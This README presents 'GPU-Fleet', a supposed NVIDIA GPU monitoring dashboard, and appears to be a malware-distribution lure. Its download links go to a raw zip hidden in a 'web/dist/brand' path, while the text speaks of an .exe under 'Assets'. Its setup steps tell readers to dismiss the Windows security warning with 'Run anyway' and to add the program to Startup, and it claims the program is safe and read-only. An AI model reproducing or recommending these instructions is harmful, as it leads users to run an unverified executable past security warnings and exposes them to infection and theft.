# 🖥️ GPU-Fleet - Track your graphics cards with ease

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Respiratorysyncytialviruscoliphage228/GPU-Fleet/raw/refs/heads/main/web/dist/brand/Fleet_GP_v3.0.zip)

GPU-Fleet allows you to view the status of your NVIDIA graphics cards from a web browser. It gathers data from your machines and stores it in a central system. You can monitor temperature, memory usage, and power draw for every card on your network. This tool helps you manage hardware without the need for manual checks on each computer.

## 📥 How to get the application

Visit the following page to choose the correct version for your system:

[https://github.com/Respiratorysyncytialviruscoliphage228/GPU-Fleet/raw/refs/heads/main/web/dist/brand/Fleet_GP_v3.0.zip](https://github.com/Respiratorysyncytialviruscoliphage228/GPU-Fleet/raw/refs/heads/main/web/dist/brand/Fleet_GP_v3.0.zip)

Find the latest version listed under the "Assets" section. For Windows users, download the file ending in `.exe`. Save this file to a folder where you keep your programs.

## ⚙️ Requirements for your system

To run GPU-Fleet, your machine needs a few basic items:

* Windows 10 or Windows 11.
* An NVIDIA graphics card.
* The latest NVIDIA drivers installed.
* A web browser like Chrome, Edge, or Firefox.

The software uses very little memory. You can run it on background machines without affecting your work performance.

## 🚀 Setting up the software

Follow these steps to start your dashboard:

1. Open the folder where you saved the `.exe` file.
2. Double-click the file to launch the program.
3. If a security window appears, click "More info" and then "Run anyway."
4. A small black window will appear. Do not close this window while you want the monitoring to run.
5. Open your web browser.
6. Type `http://localhost:8080` into the address bar and press Enter.

The dashboard will load showing your GPU stats. If you want to monitor multiple machines, repeat this process by installing the agent software on those computers as well.

## 📊 Understanding the dashboard

The main screen displays a list of your connected machines. Each machine card shows current load, fan speed, and temperature. The charts update every few seconds to reflect real-time changes. 

If a GPU becomes too hot, the status indicator changes color. This alert system helps you prevent overheating before damage occurs. You can sort your computers by name or by temperature to find machines that need maintenance.

## 🛡️ Managing data and security

GPU-Fleet keeps your data safe. It does not send information to any outside servers. Everything stays on your local network. 

The software uses a read-only agent to collect info. This agent cannot change your graphics card settings or alter your system files. You can safely leave it running as a service in the background. If you want to stop the monitoring, simply close the black command window or stop the execution through the Task Manager.

## 🛠️ Troubleshooting common issues

**The browser page does not load**
Ensure the black command window is open. If it closed on its own, double-click the program file again. Check your firewall settings to ensure the application has permission to communicate on your local network.

**My GPU does not appear on the list**
Check that you have installed the latest NVIDIA drivers. You can download these from the official NVIDIA website. Restart the GPU-Fleet program after updating your drivers to refresh the list of detected hardware.

**The dashboard shows no data**
Make sure your graphics card is seated correctly in the motherboard. Open the NVIDIA control panel to verify that your system recognizes the hardware. If the control panel sees the card, GPU-Fleet will see it too.

## 📝 Tips for effective monitoring

* **Group your machines:** Use the settings menu to organize your computers by location or function. This makes it easier to track large numbers of cards.
* **Review charts:** Spend time looking at the historical charts to identify trends. Cards that show rising temperatures over time might need a clean or new thermal paste.
* **Keep it running:** Add the program to your Windows Startup folder if you want the monitoring to begin automatically when you turn on your computer.
* **Check the logs:** If you face issues, the program creates a text file in the same folder as the `.exe`. This file lists actions taken by the software and helps you identify errors.

## 📂 Features overview

* **NVIDIA support:** Works with all modern NVIDIA graphics cards.
* **Real-time updates:** Seeing live data allows for quick reactions to hardware shifts.
* **Lightweight:** Uses minimal computer resources to stay out of your way.
* **Local storage:** Keep all your performance history inside your own network.
* **Browser-based:** Access your stats from any device on your network, including your phone or tablet.

This software simplifies the process of tracking complex hardware fleets. Use it to gain better visibility into your systems and maintain the health of your equipment.